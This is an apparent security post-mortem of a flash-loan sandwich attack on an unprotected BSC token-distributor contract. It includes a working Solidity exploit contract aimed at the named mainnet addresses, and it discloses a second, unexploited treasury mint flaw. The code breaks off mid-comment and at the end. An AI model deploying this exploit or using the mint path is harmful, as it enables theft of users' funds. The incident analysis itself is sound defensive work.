---
title: "CryptoDAOGlobal Attack Analysic"
date: 2026-08-14T16:57:50+08:00
draft: false
author: yinhui
categories: ["security"]
tags: ["attack"]
---

On BSC block 112652246, this transaction succeeded with 5,206 internal calls. The top-level caller was a contract at 0xf00bC28D22d71Be74Bc8aB0d11Fe77F6D77850ac, invoked by EOA 0x427671b2c8e91034a91fe698f9b7259b2345f45d, and the entry function is literally called `attack(address,uint256,uint256)`. When it was over, 13,445.27 USDT had moved to the EOA. This post is about what that transaction did, and how a fork reproduction of it matches the trace to the dollar.

<!--more-->

BSC · block 112652246 · tx 0x6a50fea9a44cf8c1bd288fb1857da942dd601a1a062aff9598b755f3e7580ff4 ([BSCScan](https://bscscan.com/tx/0x6a50fea9a44cf8c1bd288fb1857da942dd601a1a062aff9598b755f3e7580ff4))

## The victim: a harvest-and-distribute bot

The attacked contract is a TransparentUpgradeableProxy at 0xc44f2acCAc20598A3F2b4D489A970Fcf52a04A3C. Its implementation (0x7fBA63d0c45f265c1bEa3Ed2e49f0691A9d9AA87) is not verified on BSCScan, so the behavior below is reconstructed from decompiled bytecode and cross-checked against on-chain storage and the attack trace itself.

It is an automated "harvest and distribute" bot:

- it holds the project's own token, Pro (0x8D65744527f55d0b2338350912d5C99A81ddF0e2, 9 decimals),
- periodically it swaps part of that balance into USDT through the PancakeSwap V2 router (0x10ED43C718714eb63d5aA57B78B54704E256024E),
- and it pays the USDT out to a rotating list of three receivers: 0xD9c854EDC2680D55C4dC7c601510AedC3d7F7252, 0xc3994bfFb5410D79Fd63f7D8761A72204F780369, 0x4e94c21CD9d262f3D0d0Ef143Fae38b071da38af.

At the reference block it held 172,845.92 Pro, around $10.45M at pool prices.

The interesting part is `exec()`, the function that does the swap and payout. It has no access-control modifier. Anyone can call it:

```
(canExec, amountPerReceiver) = computeExecutionAmount()
//   bal = Pro.balanceOf(this)
//   perReceiver = bal / (receivers.length - cursor)
//   canExec = perReceiver >= 10 Pro (threshold)
if (!canExec) return

approve(router, allowance + amountPerReceiver)       // allowance grows, spend is capped
receiver = receivers[cursor]
amountIn = min(amountPerReceiver, 50e9)              // hard cap: 50 Pro per call
amounts = router.getAmountsOut(amountIn, [Pro, USDT]) // live quote from the same pool
minOut = amounts[1] * 9500 / 10000                   // 5% slippage tolerance
router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
    amountIn, minOut, [Pro, USDT], receiver, block.timestamp)
cursor = (cursor + 1) % receivers.length
```

Three things stand out.

First, the per-call cap is 50 Pro. The main Pro/USDT pair (0x63844BD4BFad910B1643713302a1cC1ed20d50c3) held about 43,617,209.76 USDT and 721,445.08 Pro at the time (~60.46 USDT per Pro), so a single 50-Pro sell moves the price by roughly 0.007%. The cap looks like a safety measure, and against one call it is.

Second, the cap is per call, not per block. `exec()` can be called in a tight loop from one contract. Each iteration re-quotes `getAmountsOut` from the pool's current state and then swaps, so the 5% tolerance is always measured against the pre-swap price and never fires. The impact of hundreds of calls accumulates the way one large sell would; the per-call cap does not bound the batch.

Third, the caller does not control the direction, the route, or the payout address. The only input an attacker controls is *when* to call. That is the one thing a sandwich needs. (There is also a smaller smell: `approve` adds the uncapped `perReceiver` to the allowance on every call while the actual spend is capped at 50 Pro, so the allowance drifts upward without bound — this attack did not need it.)

## Why one call isn't enough, and ~300 are

A naive sandwich is: sell Pro, trigger one `exec()`, buy Pro back. Measured on a fork, that loses money — a 10,000-Pro front-run nets −17,989 USDT, a 50,000-Pro one nets −89,356 USDT. The 50-Pro cap means the front-run dominates the whole trade, and the 2.5% sell tax on Pro plus the 0.25% router fee eat the thin spread.

The profit only appears when the loop is long enough that the distributor's own repeated dumps push the price below where the attacker sold. With pre-funded capital, breakeven is around 240 `exec()` calls. At the real BSC block gas limit of 55,000,000 (measured on block 112652245), a warm `exec()` call costs about 56k gas, so 957 calls fit in one transaction — 957 calls dump 47,850 Pro into the pool and turn the trade from −$17k into +$235k..+$562k depending on front-run size. The verdict depends entirely on the real gas limit and the real per-call gas cost; estimates built on a guessed limit land on the wrong side of breakeven.

## The capital problem, and the route the attacker actually took

The remaining question is where the Pro comes from. Three candidate routes:

1. Flash-swap Pro from the *target* pair itself. Fails 100%: `exec()` trades back on the same pair inside the flash callback, so the V2 reentrancy mutex (`Pancake: LOCKED`) reverts everything.
2. Flash-borrow USDT from an unrelated pool (the WBNB/USDT pair 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE), buy Pro, run the sandwich, sell the Pro back, repay. Structurally negative: the bootstrap buy and the final liquidation each pay the 2.5% Pro tax plus router fees, and those two extra round trips (about −273k and −244k at 150k-Pro equivalent) swamp the spread the loop creates. All eight sizes tested revert at the repayment step (`BEP20: transfer amount exceeds balance`); the loss scales at roughly 3.4 USDT per Pro and there is no breakeven.
3. Flash-borrow Pro itself from a *different* pool that also holds Pro. This is what actually happened.

There is a second Pro pool on BSC: the Pro/CDAO pair 0x86aC451a0c0bcAc5b74116Ae90832e89E9c630df, whose Pro reserve was 68,381.242234708 Pro at the time. Because the borrowed asset *is* the target asset, there is no buy-in leg and no liquidation leg. One detail makes this cheap: the 2.5% transfer tax on Pro applies only to transfers into the main Pro/USDT pair (measured on the fork); transfers into the Pro/CDAO pair are untaxed. So the flash loan is repaid with `borrowed × 10000/9975 + 1` — the standard 0.25% V2 flash fee — and nothing more.

The attack, step by step (numbers from the trace, reproduced on a fork):

1. `swap()` on the Pro/CDAO pair with `amount0Out = 68,381.242 Pro` — the pair's entire Pro reserve minus 0.000234708 Pro. The `pancakeCall` callback lands in the attacker contract.
2. Sell into the main pair: 2.5% tax (1,709.53 Pro) goes to the token's fee receiver, 66,671.71 Pro net reaches the pool, and the attacker gets 3,681,405.54 USDT.
3. Loop `exec()` 305 times. Each call swaps 50 Pro (1.25 Pro tax, 48.75 Pro into the pool) and pays the USDT to the next receiver; 15,250 Pro total is dumped. The payout per call drifts from ~2,464 USDT down to ~2,374 USDT as the price slides.
4. Buy back 68,552.62 Pro (= 68,381.242 × 10000/9975 + 1) for 3,667,960.26 USDT and repay the Pro/CDAO pair.
5. Net profit: 13,445.27 USDT, transferred to the EOA. The transaction used ~19.06M gas — barely a third of the block's 55M.

The front-run sold at an average of ~55.2 USDT per Pro; the buyback ran at ~53.5 on average. The spread is produced by the distributor's own 305 dumps pushing the price down in between.

## Fork reproduction

The whole thing was reproduced with Foundry against a fork of BSC at block 112652245 (the block right before the attack; gas limit 55,000,000):

```
forge test -vvv --match-path test/CryptoDAOPocTest.t.sol
```

39/39 tests pass. The calibration test replays the exact real parameters — borrow 68,381.242 Pro, 305 `exec()` calls — and matches the trace to the dollar:

| metric                        | trace        | fork         |
| ----------------------------- | ------------ | ------------ |
| Pro borrowed (Pro/CDAO flash) | 68,381.242   | 68,381.242   |
| net Pro sold into main pair   | 66,671.71    | 66,671.71    |
| front-run revenue (USDT)      | 3,681,405.54 | 3,681,405.54 |
| `exec()` calls                | 305          | 305          |
| Pro dumped by distributor     | 15,250       | 15,250       |
| buyback cost (USDT)           | 3,667,960.26 | 3,667,960.26 |
| Pro repaid                    | 68,552.62    | 68,552.62    |
| net profit (USDT)             | 13,445.27    | 13,445.27    |

The sweeps then map the shape of the trade. With the full 68,381-Pro borrow:

| `exec()` calls      | net profit (USDT)                               |
| ------------------- | ----------------------------------------------- |
| ≤ 200               | revert (`TransferHelper: TRANSFER_FROM_FAILED`) |
| 305 (real)          | +13,445                                         |
| 400                 | +57,279                                         |
| 600                 | +147,029                                        |
| 800                 | +233,483                                        |
| 943 (55M gas limit) | +293,365                                        |

Below roughly 250–300 calls the buyback costs more USDT than the front-run earned and the whole transaction reverts. 305 is the first count that works, and it is razor-thin: the buyback is 99.6% of the revenue. Above the cliff, profit rises monotonically with call count, and the loop is bounded by gas, not by the distributor's balance (172,845 Pro is enough for ~3,400 calls) and not by the lender pair's reserve (the principal is fixed regardless of call count).

The true maximum for this route is +293,365 USDT at 943 calls (54.78M gas of the 55M limit). The real attacker realized 13,445 — about 4.6% of what their own route could have made, leaving ~$280k (95.4%) on the table. The most likely reason: 305 was tuned upward from a low count until the transaction stopped reverting — tuned for success, not for profit. Gas was not the constraint (19.06M used of 55M), and neither was pool depth.

For context, the zero-capital ceiling here is 52% of the pre-funded theoretical ceiling (+561,913 USDT at 150,000 Pro × 957 calls), and that pre-funded ceiling is not reachable without capital anyway — no zero-capital source provides 150k Pro. The optimal-path tests themselves are zero-capital: the bot starts with nothing and the flash-swap is its only funding.

## A second finding that wasn't used in this attack

While mapping the contracts around the distributor, the treasury and bonding layer showed a separate issue. Pro's treasury (proxy 0xf9074b5C035c961443373F78A6344e5Adc61d314, implementation 0xe6fa68ba6c32f2c18c52380277b563c89847b901, an Olympus-style `CryptoTreasury`, verified) has this function:

```solidity
function destroyBondReserve(address _token, uint256 _amount, uint256 _profit) external returns (uint256) {
    require(isReserveToken[_token] && isReserveDepositor[msg.sender], "Not approved");
    IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
    _permissionMint(msg.sender, _profit);   // caller-supplied, never bounded against _amount
    IERC20(_token).safeTransfer(dead, _amount);
    ...
}
```

`_profit` is minted directly and has no relationship to `_amount`. The other two reserve functions in the same file are bounded: they compute `send = value - _profit`, so `_profit > value` underflows and reverts. `destroyBondReserve` is a different code path with no such constraint.

It is reachable without admin keys. The three BondDepository contracts (proxies at 0xd337641111dDEB1d1F15B55c5931ECf34A7865ba, 0xC56D5FEF7323332A1F2aD014cA2a8Ba22B4B1321, 0xaa044262A9D25c91961260e85606fFE5f9B5E606, all sharing one unverified implementation at 0x03a05f1b78c075fd506d2ec38b5020cf571d5ace) are `isReserveDepositor`, and `deposit()` forwards a caller-computed payout to `destroyBondReserve`. The gates on `deposit()` are that `_depositDays` clears the bond price and that `_referral` is a bound address — both are caller-supplied parameters, so any caller can satisfy them (0xaa942329B1099998Bb2Fa57ECca532A27b02A0D4 is a bound address that works) without being bound themselves. Governance has also listed Pro itself as a reserve token, so a depositor can deposit Pro, watch it get burned to `dead`, and have brand-new Pro minted in return at 100/bondPrice — 1.111x, 1.176x or 1.25x depending on which of the three depositories (bondPrice 90/85/80) is used.

What keeps this from being an instant money printer in practice is the vesting: the three depositories' vesting terms are 34,992,000 / 69,984,000 / 104,976,000 blocks — roughly 3.3 / 6.6 / 10 years at BSC's ~3-second blocks — and the `_depositDays` parameter only has to clear the bondPrice check; it never touches the actual vesting constant. Withdrawal is a slow linear unlock from the first block. The mint itself is immediate and permissionless, but monetizing it takes years. The attack trace contains no calls to `destroyBondReserve` or the BondDepository at all: this issue was found in the review, not exploited in this transaction.

## Takeaway

The core mistake is treating a per-call cap as a per-block cap. A permissionless `exec()` that re-quotes and re-swaps inside a loop is a sell ladder the protocol runs for whoever calls it; the caller controls only the timing, and timing is the one input a sandwich needs. The 50-Pro cap limited a single call to ~0.007% price impact, but the loop is bounded only by block gas — at ~56k gas per warm call and a 55M limit, that is roughly 950 calls of accumulated impact. A per-block cap or a batch limit would have closed this directly; a floor-price check on the swap would have stopped the loop from pushing the price through the floor. The distributor also picked a route with a 5% slippage tolerance quoted fresh from the same pool it trades on, which is exactly the setup that lets a manipulated series of small trades pass through unchecked.



## POC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakePair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IDistributor {
    function exec() external;
    function getExecInfo() external view returns (uint256, bool);
}

contract AttackerBot {
    address public constant PRO_TOKEN = 0x8D65744527f55d0b2338350912d5C99A81ddF0e2;
    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address public constant PAIR = 0x63844BD4BFad910B1643713302a1cC1ed20d50c3;
    address public constant DISTRIBUTOR = 0xc44f2acCAc20598A3F2b4D489A970Fcf52a04A3C;
    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    // PancakeSwap V2 WBNB/USDT pair (token0 = USDT, token1 = WBNB), unrelated to Pro.
    // Borrowing USDT here does NOT trip the reentrancy lock of the Pro/USDT pair.
    address public constant WBNB_USDT_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    // PancakeSwap V2 Pro/CDAO pair (token0 = Pro, token1 = CDAO). Pro is DIRECTLY
    // one of this pair's tokens, so a flash-swap here borrows Pro with no
    // intermediate conversion — this is the REAL attack trace's capital source
    // (fork block 112652245: Pro reserve0 = 68,381.242234708 Pro).
    address public constant PRO_CDAO_PAIR = 0x86aC451a0c0bcAc5b74116Ae90832e89E9c630df;

    uint256 public constant MIN_GAS_RESERVE = 300_000;

    struct AttackResult {
        uint256 proFrontrun;          // Pro sold in front-run (raw, 9 dec)
        uint256 usdtRevenueStepA;     // USDT gained from front-run sell (raw, 18 dec)
        uint256 callsExecuted;        // Number of exec() calls completed
        uint256 proDumpedStepB;       // Total Pro dumped by distributor (raw, 9 dec)
        uint256 usdtSpentStepC;       // USDT spent to buy back Pro (raw, 18 dec)
        int256 netProfitUSDT;         // Deal variant: usdtRevenueStepA - usdtSpentStepC.
                                      // Self-financed variant: TRUE profit after loan repayment.
        uint256 gasUsed;              // Total gas used
        bool isFlashLoan;             // Whether funded via flash loan
        // --- Self-financed variant fields (WBNB/USDT flash-swap bootstrap) ---
        uint256 usdtBorrowed;         // USDT principal flash-borrowed (raw, 18 dec)
        uint256 usdtBuyInCost;        // USDT actually spent buying Pro in bootstrap (raw, 18 dec)
        uint256 usdtFinalSale;        // USDT from liquidating the Pro position at the end (raw, 18 dec)
        uint256 usdtRepaid;           // Principal + 0.25% fee repaid to the WBNB/USDT pair (raw, 18 dec)
        int256 grossProfitBeforeLoan; // revenueA + finalSale - buyIn - spentC (before repayment)
        int256 netProfitAfterLoan;    // TRUE profit = balance after full loan repayment
    }

    AttackResult public lastResult;

    constructor() {
        IERC20(PRO_TOKEN).approve(ROUTER, type(uint256).max);
        IERC20(USDT).approve(ROUTER, type(uint256).max);
    }

    /// @notice Execute attack with pre-funded Pro (deal variant)
    /// @param amountProFrontrun Amount of Pro to sell in front-run leg
    /// @param maxCalls Max exec() calls to execute (0 = loop until gas budget exhausted)
    function attackWithDeal(
        uint256 amountProFrontrun,
        uint256 maxCalls
    ) external returns (AttackResult memory result) {
        uint256 startGas = gasleft();

        result.proFrontrun = amountProFrontrun;
        result.isFlashLoan = false;

        uint256 initialUSDT = IERC20(USDT).balanceOf(address(this));
        uint256 initialDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);

        // Step A: Front-run sell Pro for USDT
        if (amountProFrontrun > 0) {
            address[] memory path = new address[](2);
            path[0] = PRO_TOKEN;
            path[1] = USDT;
            IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountProFrontrun,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterA = IERC20(USDT).balanceOf(address(this));
        result.usdtRevenueStepA = usdtAfterA - initialUSDT;

        // Step B: Loop exec() calls
        uint256 calls = 0;
        while (gasleft() > MIN_GAS_RESERVE && (maxCalls == 0 || calls < maxCalls)) {
            // Check if distributor has enough balance to exec
            // perReceiver >= threshold (10 Pro)
            // If distributor balance drops below threshold, exec will not swap
            uint256 distBal = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
            if (distBal < 10e9) {
                break;
            }
            IDistributor(DISTRIBUTOR).exec();
            calls++;
        }
        result.callsExecuted = calls;
        uint256 finalDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
        result.proDumpedStepB = initialDistributorPro > finalDistributorPro 
            ? initialDistributorPro - finalDistributorPro 
            : 0;

        // Step C: Back-run buy back exact amountProFrontrun Pro using USDT
        if (amountProFrontrun > 0) {
            address[] memory pathBuy = new address[](2);
            pathBuy[0] = USDT;
            pathBuy[1] = PRO_TOKEN;
            IPancakeRouter02(ROUTER).swapTokensForExactTokens(
                amountProFrontrun,
                type(uint256).max,
                pathBuy,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterC = IERC20(USDT).balanceOf(address(this));
        result.usdtSpentStepC = usdtAfterA - usdtAfterC;

        result.netProfitUSDT = int256(result.usdtRevenueStepA) - int256(result.usdtSpentStepC);
        result.gasUsed = startGas - gasleft();

        lastResult = result;
    }

    /// @notice Execute attack with PancakeSwap V2 flash-swap (self-financing variant)
    /// @param amountProBorrow Amount of Pro to borrow via flash-swap
    /// @param maxCalls Max exec() calls to execute (0 = loop until gas budget exhausted)
    function attackWithFlashSwap(
        uint256 amountProBorrow,
        uint256 maxCalls
    ) external returns (AttackResult memory result) {
        uint256 startGas = gasleft();

        bytes memory data = abi.encode(amountProBorrow, maxCalls, startGas);
        // token0 is USDT, token1 is PRO
        IPancakePair(PAIR).swap(0, amountProBorrow, address(this), data);

        result = lastResult;
    }

    /// @notice Self-financed attack: flash-borrow USDT from the WBNB/USDT pair,
    ///         bootstrap a Pro position on the open market, sandwich the exec()
    ///         loop, liquidate the Pro position, repay principal + 0.25% fee.
    /// @param usdtBorrowAmount USDT principal to flash-borrow (token0 of WBNB/USDT pair)
    /// @param maxCalls Max exec() calls to execute (0 = loop until gas budget exhausted)
    function attackSelfFinanced(
        uint256 usdtBorrowAmount,
        uint256 maxCalls
    ) external returns (AttackResult memory result) {
        uint256 startGas = gasleft();

        bytes memory data = abi.encode(usdtBorrowAmount, maxCalls, startGas);
        // token0 = USDT, token1 = WBNB -> borrow amount0Out = usdtBorrowAmount
        IPancakePair(WBNB_USDT_PAIR).swap(usdtBorrowAmount, 0, address(this), data);

        result = lastResult;
    }

    /// @notice OPTIMAL-PATH attack (matches the real attack trace): flash-swap-borrow
    ///         Pro DIRECTLY from the Pro/CDAO pair (token0 = Pro, token1 = CDAO),
    ///         sell it into the main Pro/USDT pair (front-run), loop the
    ///         distributor's permissionless exec() to force-dump its Pro balance
    ///         and crash the price, buy back exactly enough Pro to repay principal
    ///         + PancakeSwap V2's 0.25% fee, and repay the Pro/CDAO pair.
    ///         Why this route works where the others failed:
    ///         - Pro/USDT pair flash-swap: reverts (Pancake: LOCKED reentrancy).
    ///         - WBNB/USDT bootstrap: structurally unprofitable (double round-trip
    ///           friction: buy-in + liquidation each pay 2.5% sell tax + fees).
    ///         - Pro/CDAO: Pro is DIRECTLY a token of this pair, so the borrow IS
    ///           the target asset — no intermediate purchase or liquidation leg.
    ///         The Pro sell tax (2.5%) applies ONLY to transfers into the main
    ///         Pro/USDT pair (verified empirically on the fork), so the repayment
    ///         transfer to the Pro/CDAO pair needs no 9750 gross-up — the amount
    ///         that must arrive at the pair is exactly borrowed * 10000/9975 + 1.
    /// @param proBorrowAmount Pro to borrow (amount0Out; V2 requires strictly less
    ///        than the pair's Pro reserve — the real attacker took ~the full reserve)
    /// @param maxCalls Max exec() calls to execute (0 = loop until gas budget exhausted)
    function attackOptimalPath(
        uint256 proBorrowAmount,
        uint256 maxCalls
    ) external returns (AttackResult memory result) {
        uint256 startGas = gasleft();

        bytes memory data = abi.encode(proBorrowAmount, maxCalls, startGas);
        // token0 = Pro, token1 = CDAO -> borrow amount0Out = proBorrowAmount
        IPancakePair(PRO_CDAO_PAIR).swap(proBorrowAmount, 0, address(this), data);

        result = lastResult;
    }
    ///         flash loan, so the loss composition can be measured even for sizes
    ///         where the real flash path reverts (cannot repay). The caller must
    ///         have pre-funded this contract with `usdtBorrowAmount` USDT first.
    ///         This is a measurement harness, NOT part of the zero-capital claim;
    ///         the test file flags every use of it.
    function simulateSelfFinancedForDiagnostics(
        uint256 usdtBorrowAmount,
        uint256 maxCalls
    ) external returns (AttackResult memory result) {
        uint256 startGas = gasleft();

        result = _executeSelfFinancedAttack(usdtBorrowAmount, maxCalls);
        uint256 repayAmount = (usdtBorrowAmount * 10000) / 9975 + 1;
        result.usdtRepaid = repayAmount;
        result.netProfitAfterLoan = result.grossProfitBeforeLoan - int256(repayAmount);
        result.netProfitUSDT = result.netProfitAfterLoan;
        result.gasUsed = startGas - gasleft();

        // NOTE: deliberately does NOT persist lastResult — saves ~150k gas and the
        // caller reads the returned struct. The real flash path persists it because
        // attackSelfFinanced() must return the result after the pair's swap() call.
        return result;
    }

    /// @notice PancakeSwap V2 flash-swap callback dispatcher. Both the Pro/USDT pair
    ///         and the WBNB/USDT pair call this function by name; the msg.sender
    ///         discriminates which handler runs. (A "second callback" with a
    ///         different function name would never be invoked by a V2 pair.)
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if (msg.sender == PAIR) {
            _pancakeCallProUsdt(sender, amount0, amount1, data);
        } else if (msg.sender == WBNB_USDT_PAIR) {
            _pancakeCallWbnbUsdt(sender, amount0, amount1, data);
        } else if (msg.sender == PRO_CDAO_PAIR) {
            _pancakeCallProCdao(sender, amount0, amount1, data);
        } else {
            revert("Unauthorized pair");
        }
    }

    /// @notice Callback for PancakeSwap V2 flash swap on the Pro/USDT pair (unchanged logic)
    function _pancakeCallProUsdt(address /* sender */, uint /* amount0 */, uint /* amount1 */, bytes calldata data) internal {
        (uint256 amountProBorrow, uint256 maxCalls, uint256 startGas) = abi.decode(data, (uint256, uint256, uint256));

        AttackResult memory result;
        result.proFrontrun = amountProBorrow;
        result.isFlashLoan = true;

        uint256 initialUSDT = IERC20(USDT).balanceOf(address(this));
        uint256 initialDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);

        // Step A: Front-run sell the borrowed Pro for USDT
        if (amountProBorrow > 0) {
            address[] memory path = new address[](2);
            path[0] = PRO_TOKEN;
            path[1] = USDT;
            IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountProBorrow,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterA = IERC20(USDT).balanceOf(address(this));
        result.usdtRevenueStepA = usdtAfterA - initialUSDT;

        // Step B: Loop exec() calls
        uint256 calls = 0;
        while (gasleft() > MIN_GAS_RESERVE && (maxCalls == 0 || calls < maxCalls)) {
            uint256 distBal = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
            if (distBal < 10e9) {
                break;
            }
            IDistributor(DISTRIBUTOR).exec();
            calls++;
        }
        result.callsExecuted = calls;
        uint256 finalDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
        result.proDumpedStepB = initialDistributorPro > finalDistributorPro 
            ? initialDistributorPro - finalDistributorPro 
            : 0;

        // Calculate Pro required to repay the flash loan
        // Pancake fee is 0.25%: net needed at pair = (borrowed * 10000) / 9975 + 1
        // Pro token has 2.5% sell tax when transferring TO pair: toSend = (netNeeded * 10000 + 9749) / 9750
        uint256 netNeeded = (amountProBorrow * 10000) / 9975 + 1;
        uint256 proToRepay = (netNeeded * 10000 + 9749) / 9750;

        // Step C: Buy back proToRepay Pro using USDT
        if (proToRepay > 0) {
            address[] memory pathBuy = new address[](2);
            pathBuy[0] = USDT;
            pathBuy[1] = PRO_TOKEN;
            IPancakeRouter02(ROUTER).swapTokensForExactTokens(
                proToRepay,
                type(uint256).max,
                pathBuy,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterC = IERC20(USDT).balanceOf(address(this));
        result.usdtSpentStepC = usdtAfterA - usdtAfterC;

        // Repay flash loan directly to pair
        IERC20(PRO_TOKEN).transfer(PAIR, proToRepay);

        result.netProfitUSDT = int256(result.usdtRevenueStepA) - int256(result.usdtSpentStepC);
        result.gasUsed = startGas - gasleft();

        lastResult = result;
    }

    /// @notice Callback for the OPTIMAL-PATH variant: flash-borrowed Pro from the
    ///         Pro/CDAO pair (token0 = Pro, token1 = CDAO). Same sandwich shape as
    ///         the deal variant (sell high -> loop exec() -> buy back cheap), but:
    ///         (1) the borrowed asset IS the target asset (no conversion leg), and
    ///         (2) the repayment transfer to the Pro/CDAO pair is NOT subject to
    ///         the Pro sell tax — the tax applies only to the main Pro/USDT pair
    ///         (verified empirically on the fork; consistent with the real trace's
    ///         repayment of exactly borrowed * 10000/9975 + 1, with no 9750 gross-up).
    function _pancakeCallProCdao(address /* sender */, uint /* amount0 */, uint /* amount1 */, bytes calldata data) internal {
        (uint256 amountProBorrow, uint256 maxCalls, uint256 startGas) = abi.decode(data, (uint256, uint256, uint256));

        AttackResult memory result;
        result.proFrontrun = amountProBorrow;
        result.isFlashLoan = true;

        uint256 initialUSDT = IERC20(USDT).balanceOf(address(this));
        uint256 initialDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);

        // Step A: Front-run sell the borrowed Pro into the main Pro/USDT pair.
        // The 2.5% Pro sell tax applies here (main pair is the taxed sell pair),
        // exactly as in the real attack (68,381.24 Pro -> 66,671.71 Pro net).
        if (amountProBorrow > 0) {
            address[] memory path = new address[](2);
            path[0] = PRO_TOKEN;
            path[1] = USDT;
            IPancakeRouter02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amountProBorrow,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterA = IERC20(USDT).balanceOf(address(this));
        result.usdtRevenueStepA = usdtAfterA - initialUSDT;

        // Step B: Loop exec() calls (same as the deal variant)
        uint256 calls = 0;
        while (gasleft() > MIN_GAS_RESERVE && (maxCalls == 0 || calls < maxCalls)) {
            uint256 distBal = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
            if (distBal < 10e9) {
                break;
            }
            IDistributor(DISTRIBUTOR).exec();
            calls++;
        }
        result.callsExecuted = calls;
        uint256 finalDistributorPro = IERC20(PRO_TOKEN).balanceOf(DISTRIBUTOR);
        result.proDumpedStepB = initialDistributorPro > finalDistributorPro
            ? initialDistributorPro - finalDistributorPro
            : 0;

        // Pro that must arrive at the Pro/CDAO pair to satisfy PancakeSwap V2's
        // K check after borrowing amount0Out = proBorrowAmount:
        //   balance0 * 10000 - amount0In * 25 >= reserve0 * 10000
        // with amount0In = repaid -> repaid >= borrowed * 10000 / 9975.
        // NO 9750 sell-tax gross-up: transfers to this pair are untaxed.
        uint256 proToRepay = (amountProBorrow * 10000) / 9975 + 1;

        // Step C: Back-run buy back exactly proToRepay Pro using USDT
        // (no buy tax on the main pair; same call as the deal variant)
        if (proToRepay > 0) {
            address[] memory pathBuy = new address[](2);
            pathBuy[0] = USDT;
            pathBuy[1] = PRO_TOKEN;
            IPancakeRouter02(ROUTER).swapTokensForExactTokens(
                proToRepay,
                type(uint256).max,
                pathBuy,
                address(this),
                block.timestamp
            );
        }
        uint256 usdtAfterC = IERC20(USDT).balanceOf(address(this));
        result.usdtSpentStepC = usdtAfterA - usdtAfterC;

        // Repay flash loan directly to the Pro/CDAO pair
        IERC20(PRO_TOKEN).transfer(PRO_CDAO_PAIR, proToRepay);

        // The contract started at 0 USDT and 0 Pro: netProfitUSDT is the TRUE
        // profit after loan repayment (revenueA - buybackCost, USDT left over).
        result.netProfitUSDT = int256(result.usdtRevenueStepA) - int256(result.usdtSpentStepC);
        result.gasUsed = startGas - gasleft();

        lastResult = result;
    }

    /// @notice Callback for the self-financed variant: USDT flash-borrowed from the
    ///         WBNB/USDT pair (token0 = USDT). Reuses the attackWithDeal sandwich
    ///         structure (sell high -> loop exec() -> buy back cheap), prefixed by a
    ///         bootstrap buy and suffixed by a liquidation leg.
    function _pancakeCallWbnbUsdt(address /* sender */, uint /* amount0 */, uint /* amount1 */, bytes calldata data) internal {
        (uint256 usdtBorrowAmount, uint256 maxCalls, uint256 startGas) = abi.decode(data, (uint256, uint256, uint256));

        AttackResult memory result = _executeSelfFinancedAttack(usdtBorrowAmount, maxCalls);

        // Repay principal + 0.25% PancakeSwap V2 fee. USDT has no transfer tax, so
        // only the pair's 10000/9975 fee adjustment applies (no 9750 adjustment).
        uint256 repayAmount = (usdtBorrowAmount * 10000) / 9975 + 1;
        result.usdtRepaid = repayAmount;
        IERC20(USDT).transfer(WBNB_USDT_PAIR, repayAmount);

        // Balance after repayment == gross profit before repayment - repayment
        // (the contract started at 0 USDT and spent the whole principal on the buy-in).
        result.netProfitAfterLoan = result.grossProfitBeforeLoan - int256(repayAmount);
        result.netProfitUSDT = result.netProfitAfterLoan;
        result.gasUsed = startGas - gasleft();

        lastResult = result;
    }

    /// @dev Shared core of the self-financed attack (no loan mechanics inside).
    ///      Assumes this contract already holds exactly `usdtBorrowAmount` USDT
    ///      (granted by the WBNB/USDT pair flash-swap in the real path, or by the
    ///      test harness's deal() in the DIAGNOSTIC path only).
    ///      Sequence: (0) buy Pro with borrowed USDT at the pre-attack price,
    ///      (A) sell high / front-run, (B) loop exec() to force the batch dump,
    ///      (C) buy back Pro cheap, (D) liquidate the Pro position back to USDT.
    function _executeSelfFinancedAttack(uint256 usdtBorrowAmount, uint256 maxCalls) internal returns (AttackResult memory result) {
        result.isFlashLoan = true;
